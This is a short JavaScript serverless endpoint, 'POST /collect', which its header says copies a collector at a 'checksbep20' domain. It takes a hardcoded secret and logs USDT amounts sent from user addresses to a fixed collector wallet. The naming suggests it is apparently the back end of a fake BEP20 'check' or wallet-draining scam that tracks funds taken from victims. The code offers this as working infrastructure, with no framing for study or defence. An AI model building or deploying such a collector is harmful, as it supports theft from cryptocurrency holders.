// ============================================
// COLLECT ENDPOINT - POST /collect
// Exactly like: https://collector.checksbep20.org/collect
// ============================================

const SECRET_KEY = "7x143414";
const COLLECTOR_ADDRESS = "0x5681d680B047bF5b12939625C56301556991005e";

let transactions = [];

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-Topup-Secret');
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }
    
    try {
        const body = req.body;
        const secret = body.token || body.secret || req.headers['x-topup-secret'];
        
        if (secret !== SECRET_KEY) {
            return res.status(401).json({ error: 'Invalid secret' });
        }
        
        const userAddress = body.from || body.userAddress;
        const amount = body.amount || body.amountHuman;
        
        if (!userAddress || !amount) {
            return res.status(400).json({ error: 'Missing fields' });
        }
        
        const transaction = {
            id: 'tx_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6),
            timestamp: new Date().toISOString(),
            from: userAddress,
            amount: String(amount),
            to: body.to || COLLECTOR_ADDRESS
        };
        
        transactions.unshift(transaction);
        
        console.log(`✅ ${amount} USDT from ${userAddress}`);
        
        return res.status(200).json({
            status: 'success',
            id: transaction.id
        });
        
    } catch (error) {
        return res.status(500).json({ error: error.message });
    }
}
